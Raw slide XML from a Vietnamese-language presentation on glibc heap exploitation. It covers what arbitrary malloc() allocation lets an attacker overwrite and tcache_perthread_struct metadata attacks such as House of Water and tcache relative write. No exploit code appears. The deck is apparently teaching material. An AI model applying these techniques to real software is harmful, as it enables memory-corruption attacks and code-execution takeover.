            <a:avLst>
              <a:gd name="adj" fmla="val 3721"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4416552"/>
            <a:ext cx="4370832" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>2.29–2.31: VẪN LỌT ĐƯỢC KHÔNG CẦN SAFE-LINKING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="4709160"/>
            <a:ext cx="4370832" cy="139903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Ghi đè key (qua UAF) để bypass kiểm tra key == tcache ở _int_free (5.4), hoặc lấp đầy tcache bin để chunk rơi xuống fastbin rồi free xen kẽ.</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Mục tiêu thực tế của kỹ thuật</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6.2 · MALLOC() TRẢ VỀ ĐỊA CHỈ TỰ CHỌN ĐỂ LÀM GÌ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="3605784" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3077"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="158191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MỤC TIÊU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="3240024" cy="59436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OBJECT KHÁC TRÊN HEAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2514600"/>
            <a:ext cx="3240024" cy="117043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Chunk trả về chồng lên một object khác trên heap → đọc/ghi tuỳ ý</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4291584" y="1417320"/>
            <a:ext cx="3605784" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3077"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="158191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MỤC TIÊU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="1874520"/>
            <a:ext cx="3240024" cy="59436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CẤU TRÚC TOÀN CỤC/ỨNG DỤNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474464" y="2514600"/>
            <a:ext cx="3240024" cy="117043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Chồng lên cấu trúc toàn cục/ứng dụng → ghi đè con trỏ chương trình dùng về sau (Sink A, mục 5.5)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8125968" y="1417320"/>
            <a:ext cx="3605784" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3077"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="1581912"/>
            <a:ext cx="3240024" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MỤC TIÊU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="1874520"/>
            <a:ext cx="3240024" cy="5943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FSOP / ROP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8308848" y="2514600"/>
            <a:ext cx="3240024" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chồng lên cấu trúc dùng cho FSOP/ROP → chiếm luồng thực thi (Sink B, mục 5.5)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4023360"/>
            <a:ext cx="11274552" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4187952"/>
            <a:ext cx="10908792"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ARBITRARY ALLOCATION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4480560"/>
            <a:ext cx="10908792"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Một cơ chế, nhiều đích khác nhau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4937760"/>
            <a:ext cx="10908792" cy="1170432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>malloc() trả về chunk tại địa chỉ đã chọn là nguyên nhân gốc chung — hai PoC đã chạy ở mục 5.5 (Sink A, Sink B) là hai minh hoạ cụ thể của đúng hai mục tiêu giữa và cuối ở trên.</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Tcache metadata attack: chiếm cả size class</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6.3 · TCACHE_PERTHREAD_STRUCT Ở ĐẦU HEAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="4572000" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2222"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="4206240"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GHI ĐƯỢC VÀO STRUCT ĐẦU HEAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="4206240" cy="2724912"/>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1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sửa </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>entries[idx]</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: mọi </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> cùng size class sau đó trả địa chỉ ta chọn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sửa </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>counts[idx]</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: glibc tin bin còn chunk dù thực tế không có</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Điều khiển cả lớp kích thước thay vì một chunk đơn lẻ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4937760"/>
            <a:ext cx="4572000" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5714"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5166360"/>
            <a:ext cx="1965960" cy="82296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200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>counts[64]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2834640" y="5166360"/>
            <a:ext cx="1965960" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>entries[64]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="1417320"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="1581912"/>
            <a:ext cx="27569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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="1874520"/>
            <a:ext cx="2756916" cy="36576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House of Water</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="2286000"/>
            <a:ext cx="2756916" cy="130759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Biến lỗi UAF/tràn thành quyền kiểm soát tcache_perthread_struct; hướng hiện đại khi safe-linking làm khó việc sửa free list</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8609076" y="1417320"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="1581912"/>
            <a:ext cx="27569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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="1874520"/>
            <a:ext cx="2756916" cy="36576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Safe-link double protect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="2286000"/>
            <a:ext cx="2756916" cy="130759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Sắp xếp con trỏ để các mặt nạ XOR triệt tiêu; XOR hai lần chưa đủ vì mask sinh từ địa chỉ lưu trữ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="3931920"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="4096512"/>
            <a:ext cx="27569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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="4389120"/>
            <a:ext cx="2756916" cy="36576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Tcache relative write</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="4800600"/>
            <a:ext cx="2756916" cy="130759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Làm hỏng </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mp_.tcache_bins</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> khiến tc_idx vượt phạm vi, ghi metadata ra ngoài vùng heap dự kiến</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8609076" y="3931920"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="4096512"/>
            <a:ext cx="27569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BIẾN THỂ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8791956" y="4389120"/>
            <a:ext cx="2756916" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
